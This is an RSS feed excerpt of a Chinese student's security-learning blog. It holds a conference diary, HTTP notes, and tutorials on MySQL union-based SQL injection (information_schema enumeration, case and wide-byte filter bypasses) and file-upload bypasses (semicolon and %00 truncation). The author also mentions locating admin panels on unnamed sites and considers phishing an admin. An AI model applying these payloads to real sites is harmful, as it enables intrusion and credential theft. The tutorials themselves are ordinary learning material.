&lt;p>keep quiet and just going on.&lt;/p></description></item><item><title>校园杂记4：中国的黑客是很cool的一群人</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B04%E4%B8%AD%E5%9B%BD%E7%9A%84%E9%BB%91%E5%AE%A2%E6%98%AF%E5%BE%88cool%E7%9A%84%E4%B8%80%E7%BE%A4%E4%BA%BA/</link><pubDate>Mon, 25 Sep 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B04%E4%B8%AD%E5%9B%BD%E7%9A%84%E9%BB%91%E5%AE%A2%E6%98%AF%E5%BE%88cool%E7%9A%84%E4%B8%80%E7%BE%A4%E4%BA%BA/</guid><description>&lt;h3 id="翘课参加ssc">翘课参加SSC&lt;/h3>
&lt;p>狗牌&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20210828214514.png" alt="" />&lt;/p>
&lt;hr>
&lt;p>今天一个人去参加了ssc，还没到会场就看见陆陆续续的人往会场走，因为会场挺偏的在一个酒店，一般人不多，而且那些人身上就有股geek的气息，所以我感觉，嗯没错除了我都是大黑阔（现场的感觉贼棒哈哈哈）.&lt;/p>
&lt;p>戴上牌子入场前的签到，看见都是三三两两西电，西交，西工大那些信安的黑阔们，没有信安专业的不得不说有一点羡慕QAQ.&lt;/p>
&lt;p>有个跟我一起进场的，牛仔裤，头发超短，深色长袖，背个电脑包，像个大学生。&lt;/p>
&lt;p>但是，当我发现他是上午最后一个上去演讲的，蚂蚁金服的安全研究员…讲的fuzz代码发现漏洞…我只有 震!惊! 根本看不粗来!!! 果然黑阔都是不容易被看穿的属性啊。&lt;/p>
&lt;p>整个上午的演讲里，还有个特有意思的，就是360 team unicorn的杨卿大佬讲的独角兽团队管理（其实他讲了超多的unicorn在defcon的表现啊，还有很多攻击手段展示）&lt;/p>
&lt;p>…反正我是兴奋cry，原来IOT这!么!有!意!思!&lt;/p>
&lt;p>以前听汤老师讲过有人能让atm吐钱啊啥啥啥的, 今天杨卿就展示了一次用nfc开走别人的车（无线车钥），用nfc刷别人的卡用别人的钱…还展示了#CVD-0001的漏洞，绕过google认证系统 劫持手机（妈妈我要学IOT，我要学嵌入式，我要QVQ….）&lt;/p>
&lt;blockquote>
&lt;p>很兴奋的现场&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20210828214945.png" alt="" />&lt;/p>
&lt;blockquote>
&lt;p>很兴奋的现场2&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20210828215008.png" alt="" />&lt;/p>
&lt;h2 id="heading">&lt;/h2>
&lt;p>中午兜兜转转找了家日式拉面店吃了碗玉子拉面=。=（原来玉子就是溏心蛋嘛，第一次知道）..感觉西安物价和上海差的不多（就吃玉子拉面而言）&lt;/p>
&lt;p>吃完了就回到了会场里，还算回的比较早的..两次演讲以后（感觉这届ssc的很多演讲都跟机器学习有关..）有工作人员开始往台子上摆椅子了，圆桌会议！！！&lt;/p>
&lt;p>椅子上的都是大佬…360的，百度的，万涛，冰河，还有个四叶草的ceo马坤…还有一个不知道叫啥, 聊了些大方向的问题，因为在陕西，又因为最近几年的一带一路，所以聊了很多这方面的问题.&lt;/p>
&lt;h3 id="总结">总结&lt;/h3>
&lt;p>今天的很多演讲，讲web安全的其实有两三个，还都跟机器学习相关，一个是用机器学习来找出webshell的page，还有一个是百度的人工智能相关，更多的像360杨卿讲的跟IOT很相关…&lt;/p>
&lt;p>总感觉web安全似乎前景不是那么广，门槛越来越高，现在看上去开发安全产品像安全狗那样的就能把一大部分像我这样的脚本小子给拒之门外了..&lt;/p>
&lt;p>而且随着人工智能越来越intellectual，网站开发肯定是越来越安全的，而反观IOT，嵌入式设备，它们的安全相较web来说就更弱一点，前景更大，所以我也在考虑什么时候再去请教一波学长，指点一下方向….&lt;/p>
&lt;hr>
&lt;p>最后，圆桌会议结束的时候，万涛按住了旁边想要起身的人,拿起话筒说了句，”我知道在座的很多都是学生，喜欢安全的，那么最后对大家说一句话，”&lt;/p>
&lt;blockquote>
&lt;p>“今天，人们能看到光明，是因为有人帮他们挡住了黑暗。 希望大家好好努力。”&lt;/p>
&lt;/blockquote>
&lt;p>简直让人泪目啊啊啊.听到这些话，虽然我就是个刚了解安全两个月的小菜鸡，也想到了很多，有乌云的下线，有阿里月饼事件，有世纪佳缘事件里的白帽子，有办geekpwn的大牛蛙，有带着团队历经辛苦最终踏入hall of fame的360杨卿。&lt;/p>
&lt;p>黑客的世界就像一个江湖，每个黑客的背后都有一个自己的传奇.我们对黑客不了解的人，感觉会把他们当成像写出熊猫烧香那样或者做黑产的bad guys…实际上真正的黑客就是一群喜欢技术，ge里ge气的人.&lt;/p>
&lt;p>我知道的中国老黑客仿佛都有一种使命感，就是把自己身上的黑客精神传承下去，传给中国的下一代.&lt;/p>
&lt;p>白帽子这个群体的地位可能是有一点尴尬，但是我相信环境正在变得越来越好，希望我们都能把信息安全当作一种信仰，有所坚持.&lt;/p>
&lt;p>keep going on.&lt;/p></description></item><item><title>初识SQL注入</title><link>https://sera.wang/p/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/</link><pubDate>Tue, 19 Sep 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>盲注，报错注入，有时间再写写。&lt;/p>
&lt;p>sql注入的作用：&lt;/p>
&lt;pre tabindex="0">&lt;code>它可以获取信息（用户名密码），也可以写信息（shell）
&lt;/code>&lt;/pre>&lt;p>sql注入根据数据库的不同也有区别，很流行的有两个组合，一是asp+access，二是php+mysql.&lt;/p>
&lt;p>今天总结的是后者&lt;/p>
&lt;h2 id="phpmysql">php+mysql&lt;/h2>
&lt;p>我们知道mysql是这样分的：&lt;/p>
&lt;p>Mysql-&amp;gt;选择数据库-&amp;gt;选择表-&amp;gt;选择列-&amp;gt;存储信息&lt;/p>
&lt;p>要理解sql注入，首先要知道后台脚本语言和基本sql语句的知识。&lt;/p>
&lt;p>我们的目的就是获取最后一步的那个存储的信息，接下来我说一下一次比较完整的sql注入的过程：&lt;/p>
&lt;p>它首先可以在url中进行也可以抓包 (使用burpsuite之类的抓包工具，或者fx-hackbar) 进行，根据提交方式(get,post)和注入手段(cookie)的不同也要不同对待。&lt;/p>
&lt;p>比如目标网站有个文章功能，这个url是&lt;/p>
&lt;pre tabindex="0">&lt;code>http://www.target.com/article.php?p=1
&lt;/code>&lt;/pre>&lt;p>问号后面就是传递的参数p，值为1（这里根据参数的不同也要注意注入的区别，下面介绍最简单的纯数字参数的注入）&lt;/p>
&lt;p>对p=1做文章&lt;/p>
&lt;ol>
&lt;li>首先对目标url进行sql注入测试，像这样&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>http://www.target.com/article.php?p=1 and 1=1
&lt;/code>&lt;/pre>&lt;p>和&lt;/p>
&lt;pre tabindex="0">&lt;code>http://www.target.com/article.php?p=1 and 1=2 (下面都省略成？后面的内容)
&lt;/code>&lt;/pre>&lt;p>根据这两句话判断页面变化，如果第一句返回结果是正常，第二句返回结果是无（页面正常，应该有的内容没显示）那就说明有sql注入。&lt;/p>
&lt;ol start="2">
&lt;li>order by 语句判断当前表有多少列&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>p=1 order by 12
&lt;/code>&lt;/pre>&lt;p>如果显示错误，那就说明当前表的列数&amp;lt;12，依次递减，&lt;/p>
&lt;p>如果order by 8显示正确，那就说明当前表的列数为8，然后才能进行下一步操作。&lt;/p>
&lt;ol start="3">
&lt;li>union select 1,2,3 联合查询语句&lt;/li>
&lt;/ol>
&lt;p>mysql中有几个函数对于注入很有用&lt;/p>
&lt;pre tabindex="0">&lt;code>database():显示当前使用的数据库名
user():显示当前的数据库用户名
version():显示当前的数据库版本
&lt;/code>&lt;/pre>&lt;p>语句可以像&lt;/p>
&lt;pre tabindex="0">&lt;code>p=1 union select database(),user(),version()
&lt;/code>&lt;/pre>&lt;p>这样就可以爆出数据库名，用户名和数据库版本的信息。&lt;/p>
&lt;p>另外提一点，mysql5.0以上会自带一个叫做information_schema的数据库。 如果目标没有删除这个数据库的话，就可以根据此来进行下一步操作。&lt;/p>
&lt;p>用database()获取了数据库名，我们离目标还隔着一层表、列，所以接下来先获取表&lt;/p>
&lt;pre tabindex="0">&lt;code>union select table_name,2,3 from information_schema.tables where table_schema='数据库名'
&lt;/code>&lt;/pre>&lt;p>这样就获取到了数据库下的所有表名&lt;/p>
&lt;p>接下来根据表名获取它下面的列名&lt;/p>
&lt;pre tabindex="0">&lt;code>union select column_name,2,3 from information_schema.columns where table_name='表名'
&lt;/code>&lt;/pre>&lt;p>这样我们就获取到了目标表下的所有列名信息&lt;/p>
&lt;p>然后最后执行 union select 列名1，2，3 from 表名，就可以爆出数据了。&lt;/p>
&lt;p>一些可能遇到的安全检查，&lt;/p>
&lt;p>黑名单：&lt;/p>
&lt;p>因为mysql是不区分大小写的，所以像select可以写成SeleCt&lt;/p>
&lt;p>php magic quotes：&lt;/p>
&lt;p>这是php的一个函数，类似于addslashes（）函数，给单双引号，null字符前加上反斜杠\，以此来消除危险的输入信息，对此可以采用宽字节注入&lt;/p>
&lt;p>因为中文和乱码占两个字节，符号和英文占一个字节，所以在单引号前加上像 %df这样就可以变成 %df‘，会把反斜杠结合成一个乱码或者中文字符。&lt;/p>
&lt;p>最后，结合burpsuite或者wireshark和sql注入工具来让自己的攻击上一层台阶。&lt;/p>
&lt;p>sql注入工具对漏洞进行注入的时候用抓包工具抓下它的语句，分析，一次来更好的理解sql注入工具的攻击思路，也可以在工具注入失败的时候分析它语句的问题进行一些修改，来完善攻击。&lt;/p></description></item><item><title>校园杂记3：文件上传漏洞以及一点碎碎念</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B03%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E4%B8%80%E7%82%B9%E7%A2%8E%E7%A2%8E%E5%BF%B5/</link><pubDate>Mon, 18 Sep 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B03%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E4%B8%80%E7%82%B9%E7%A2%8E%E7%A2%8E%E5%BF%B5/</guid><description>&lt;h3 id="近况">近况&lt;/h3>
&lt;p>今天烦心事特多，很惆怅啊…..&lt;/p>
&lt;p>上完物理看了眼手机，社团里要催着大早起来搬东西；要打分了才发现去年参加的比赛因为是外校的不能用；网站备案又双叒叕没通过。&lt;/p>
&lt;p>说不出话的事情一件跟着一件…还好今天概率论就是做几道题 easy work..&lt;/p>
&lt;hr>
&lt;p>事儿多，瞎忙活，看到余弦说的一句话 “人生苦短，远离噪音” 。&amp;lt;( _ _ )&amp;gt; 虽然这句话和今天想讲的都没啥关系（默默把它记在鸡汤小册子上）&lt;/p>
&lt;p>好了，玻璃心结束，今天我可是要写完总结的人（顺带一提，张少博老师的课依旧是很有意思&amp;gt;▽&amp;lt;）&lt;/p>
&lt;hr>
&lt;p>今天看了点文件上传漏洞，%00截断，还有js绕过验证方面的东西，心里想着要赶紧把sql注入那块整理完了，还要整理一下upload的的问题。&lt;/p>
&lt;p>对于文件上传漏洞呢，总的来说就是在上传文件类型和它的名字上做手脚，从这两块出发，慢慢会涉及到iis6.0和7.0的漏洞啊之类的，判断iis还是挺简单的，通过访问目标站的 request头就可以查到。&lt;/p>
&lt;h3 id="文件文件漏洞">文件文件漏洞&lt;/h3>
&lt;p>简单来说，fileupload漏洞的原理如下，&lt;/p>
&lt;p>比如url是：http://www.xxx.com/upload.php 这个页面是上传文件的页面，只能上传jpg类型的文件（它写了个检查），那么这时候，你可以用三种手段，比如你的攻击脚本是 atk.php&lt;/p>
&lt;p>① 文件名上做手脚，把后缀改成atk.php;.jpg，这是iis6.0的一个漏洞，这样你上传就能绕过文件后缀检查（如果目标安全级别很低的话）&lt;/p>
&lt;p>访问这个文件的链接就是 &lt;a class="link" href="http://www.xxx.com/upload.php/atk.php;jpg" target="_blank" rel="noopener"
>http://www.xxx.com/upload.php/atk.php;jpg&lt;/a> 它会执行atk.php&lt;/p>
&lt;p>其实这种方法我没实验过，感觉应该不行。。&lt;/p>
&lt;p>② 动手文件名的可行版本：&lt;/p>
&lt;p>上传文件的时候，抓数据包，在数据包里改，你上传的文件是atk.php，在数据包里改成atk.php;.jpg，这种方法应该是可行的。&lt;/p>
&lt;p>③ %00截断：&lt;/p>
&lt;p>依旧是数据包，改名的时候改成 atk.php%00.jpg，一样能绕过后缀检查，而且实际上浏览器执行的是&lt;/p>
&lt;p>&lt;a class="link" href="http://www.xxx.com/upload.php/atk.php%00.jpg%ef%bc%8c%e8%bf%99%e4%b8%aa%00%e6%8a%8a%e5%90%8e%e9%9d%a2%e7%9a%84%e5%86%85%e5%ae%b9%e6%88%aa%e6%96%ad%ef%bc%8c%e6%b5%8f%e8%a7%88%e5%99%a8%e5%8f%aa%e8%a7%a3%e6%9e%90%e5%88%b0php%ef%bc%8c%e6%89%80%e4%bb%a5%e5%b0%b1%e6%88%90%e5%8a%9f%e6%89%a7%e8%a1%8c%e5%95%a6%e3%80%82" target="_blank" rel="noopener"
>http://www.xxx.com/upload.php/atk.php%00.jpg，这个%00把后面的内容截断，浏览器只解析到php，所以就成功执行啦。&lt;/a>&lt;/p>
&lt;p>注意！在数据包里不能直接写%00，因为它传到浏览器的时候还会进行url编码，所以先进行一次url转换，burpsuite里面选取了字符以后右键就会有一个url转码的功能。&lt;/p>
&lt;h2 id="heading">&lt;/h2>
&lt;p>最近听到学长说，大三了选网络方向能听到攻防课！哇！！！心里开出了发，贼开心啊 😄&lt;/p>
&lt;p>明天要6点30起床帮社团弄帐篷…..&lt;/p>
&lt;p>希望明天能吃上早饭&amp;hellip;&amp;hellip;&lt;/p></description></item><item><title>校园杂记2：好像找到学安全的感觉了?（雾）</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B02%E5%A5%BD%E5%83%8F%E6%89%BE%E5%88%B0%E5%AD%A6%E5%AE%89%E5%85%A8%E7%9A%84%E6%84%9F%E8%A7%89%E4%BA%86%E9%9B%BE/</link><pubDate>Sat, 09 Sep 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B02%E5%A5%BD%E5%83%8F%E6%89%BE%E5%88%B0%E5%AD%A6%E5%AE%89%E5%85%A8%E7%9A%84%E6%84%9F%E8%A7%89%E4%BA%86%E9%9B%BE/</guid><description>&lt;h3 id="近况">近况&lt;/h3>
&lt;p>4号的时候渗透学着学着卡住了，觉得有点崩溃就跟学长晚上聊了一下….被鼓励的感觉还是很棒的（又有了动力）&lt;/p>
&lt;p>于是就在想是不是该停下来思考一下下一步该怎么学&amp;hellip;&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>在群里找着了个比我接触渗透早了几年的大佬（十六岁…不知道为什么听到这个有点悲伤 XD）给了我几个视频。&lt;/p>
&lt;p>找视频不是没找过，找到的很多都是偏理论的。我关于各种注入的理论和原理通过暑假里读的书已经了解很多，我想现在更缺的就是实战方面的学习&lt;/p>
&lt;!-- raw HTML omitted -->
&lt;p>然后，跟着学了五天。嗯…我把自己网站的账户密码爆出来了，同时发现，原来用sqlmap都爆不出来的密码，自己post注入爆出来还是很轻松的。。那么问题来了，是sqlmap太僵了，还是我用的太蠢了呢（认真脸）&lt;/p>
&lt;p>我跟舍友去看刀剑了谢谢, 晚上再写。&lt;/p>
&lt;hr>
&lt;p>好的刀剑看完了，我觉得前二十分钟挺好看的！&lt;/p>
&lt;p>咳咳，今天把两周前的坑补好（整理了一篇http请求模型的笔记）顺带复习了一下。&lt;/p>
&lt;p>下次再整理一下sql注入顺带又给自己复习一遍。&lt;/p>
&lt;p>每个周末都要在作业上花掉好多时间…这就更气了，感觉某些朋友天生就物理和数学专精了QAQ&lt;/p>
&lt;p>每次做完题，和人一对答案就是“卧槽我怎么又和你不一样”。。自信满满写的答案全是错的😭…&lt;/p>
&lt;p>今天终于算是blog走上正途了…起码比以前自己写的那个好看多了…还能装各种插件，wordpress真是强大啊…但是安全性不知道怎么样，下次试试看再尝试入侵一波嗯。&lt;/p>
&lt;p>买了好多月饼…中秋想吃的可以随便call我：）&lt;/p>
&lt;h3 id="http请求模型">HTTP请求模型&lt;/h3>
&lt;p>当我们浏览一个网页的时候实际上经过了这些步骤：&lt;/p>
&lt;pre tabindex="0">&lt;code>① 浏览器打开了一个套接字（这个是指ip地址或域名和端口的一个组合，比如192.168.1.1：8080）连接Web服务器；
② 发送一个HTTP请求（请求头）；
③ Web服务端接收请求并返回HTTP响应（响应头Request）；
④ Web服务器关闭连接，浏览器解析响应。
&lt;/code>&lt;/pre>&lt;p>好的了解了这个以后我们来详细看一下&lt;/p>
&lt;h4 id="http请求头">HTTP请求头&lt;/h4>
&lt;p>一个请求由4个部分组成：请求行、请求头标、空行和请求数据&lt;/p>
&lt;p>① 请求行：&lt;/p>
&lt;pre tabindex="0">&lt;code>由三个标记组成：请求方法、请求URI（URL是URI的一种）、HTTP版本, 它们用空格分隔；
example：
GET /index.html HTTP/1.1
&lt;/code>&lt;/pre>&lt;p>② 请求头标：&lt;/p>
&lt;pre tabindex="0">&lt;code>由 关键字/值 对 组成，每行一对；
example：
User-Agent 浏览器版本
Accept 浏览器可识别的内容类型列表
Content-Length 附加到请求的数据字节数
&lt;/code>&lt;/pre>&lt;p>③ 空行：&lt;/p>
&lt;pre tabindex="0">&lt;code>一般放在最后一个请求头标之后，发送回车符和退行，通知服务器以下不再有头标。
&lt;/code>&lt;/pre>&lt;p>④ 请求数据：&lt;/p>
&lt;pre tabindex="0">&lt;code>请求方法是POST的时候，就会有这行。
&lt;/code>&lt;/pre>&lt;h4 id="http响应">HTTP响应&lt;/h4>
&lt;p>一个响应由4部分组成：状态行、响应头标、空行、响应数据&lt;/p>
&lt;p>① 状态行：由HTTP版本、响应代码和响应描述组成&lt;/p>
&lt;pre tabindex="0">&lt;code>HTTP版本：由客户端指明其可理解的最高版本
响应代码：3位的数字代码，指出请求的成功或失败，如果失败则指出原因。（比如，404啊，200啊，500啊，有很多）
响应描述：为响应代码的可读性解释
example：
1xx：信息，请求收到，继续处理
2xx：成功，行为被接受
3xx：重定向，为完成请求，必须进一步执行的动作
4xx：客户端错误
5xx：服务器错误
&lt;/code>&lt;/pre>&lt;p>② 响应头标：&lt;/p>
&lt;pre tabindex="0">&lt;code>跟请求头标类似，指出服务器的功能，标识出响应数据的细节
&lt;/code>&lt;/pre>&lt;p>③ 空行： 跟之前的类似&lt;/p>
&lt;p>④ 响应数据：HTML文档和图像等，即HTML本身&lt;/p>
&lt;h2 id="heading">&lt;/h2>
&lt;h3 id="总结">总结&lt;/h3>
&lt;p>对查找漏洞来说可以利用的几个方面：&lt;/p>
&lt;p>请求方式：提交方式注入（GET、POST、COOKIE）&lt;/p>
&lt;p>状态码：信息收集（扫描后台、扫描文件），可以根据状态码判断目标的路径。&lt;/p>
&lt;p>cookie：可以注入，以及xss。&lt;/p>
&lt;p>content-type：文件上传漏洞&lt;/p>
&lt;p>Referer：Csrf、xss&lt;/p>
&lt;p>还有在使用抓包工具像burpsuite 测试的时候一定要注意html编码&lt;/p>
&lt;p>比如：%20是空格&lt;/p>
&lt;p>在浏览器中可以直接空格，但是操作数据包的时候要注意它的html编码。&lt;/p></description></item><item><title>校园杂记1：这里就是我码字的地方了</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B01%E8%BF%99%E9%87%8C%E5%B0%B1%E6%98%AF%E6%88%91%E7%A0%81%E5%AD%97%E7%9A%84%E5%9C%B0%E6%96%B9%E4%BA%86/</link><pubDate>Tue, 05 Sep 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B01%E8%BF%99%E9%87%8C%E5%B0%B1%E6%98%AF%E6%88%91%E7%A0%81%E5%AD%97%E7%9A%84%E5%9C%B0%E6%96%B9%E4%BA%86/</guid><description>&lt;h3 id="ip">IP&lt;/h3>
&lt;p>用masscan扫IP一直有点困惑，今天Google + 各方请教后理清了一点关于IP的事情：&lt;/p>
&lt;ul>
&lt;li>对IP的了解&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>Windows cmd下 ipconfig可以查看
Linux terminal下 ifconfig -a 或者 ip addr 可以查看
IPv4就是本机IP地址
gateway（网关）就是电脑（或手机）连接的热点设备、路由器的IP地址
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>对于一台电脑
&lt;ul>
&lt;li>外网IP可以通过浏览器搜索“IP”得到&lt;/li>
&lt;li>内网IP可以通过 ipconfig 或 ifconfig 得到&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>注：&lt;/p>
&lt;ol>
&lt;li>多台设备连接到同一台路由器时，它们的外网IP时不同的；&lt;/li>
&lt;li>在浏览器中可以通过输入网关地址进入路由器的admin界面&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;h3 id="关于最近两个礼拜">关于最近两个礼拜&lt;/h3>
&lt;p>在虚拟机上装了kali，学习了很多工具的用法&lt;/p>
&lt;ol>
&lt;li>密码字典工具&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>Recon- NG，BruteScrape&lt;/li>
&lt;/ul>
&lt;ol start="2">
&lt;li>端口扫描工具&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>masscan，nmap（用的比较熟悉）&lt;/li>
&lt;/ul>
&lt;ol start="3">
&lt;li>Web漏洞扫描工具&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>只熟悉OWASP ZAP，工具比较简单，但是扫出来的漏洞还不太会利用，在扫描大型站点时的速度比较慢，聊胜于无&amp;hellip;&lt;/li>
&lt;li>目前扫出来的两个sql注入漏洞都是之前人肉照出来过的&lt;/li>
&lt;/ul>
&lt;ol start="4">
&lt;li>sql注入工具&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>sqlmap，一些基本指令都记在小本子上了，感觉很强大，对自己网站测试了下，可以扫出很多信息&lt;/li>
&lt;/ul>
&lt;h3 id="想法">想法&lt;/h3>
&lt;p>昨天晚上找到了三四个网站的后台，今天请教了下群里的大佬，想绕过后台难度很大，一般也不怎么用除了搞到账户密码以外的方式去登后台。其它方法主要有前台插马，注入shell，还有一个编辑器（？不太理解这个是什么方式）&lt;/p>
&lt;p>有个想法就是给网站管理员发邮件，诱导点击脚本链接得到后台账户密码。。。但是。。。感觉是个正常人都不会被骗啊&lt;/p>
&lt;p>打算重新看WEB安全的书了，渗透测试碰到web有点卡住的感觉，安全真有意思！！！&lt;/p></description></item></channel></rss>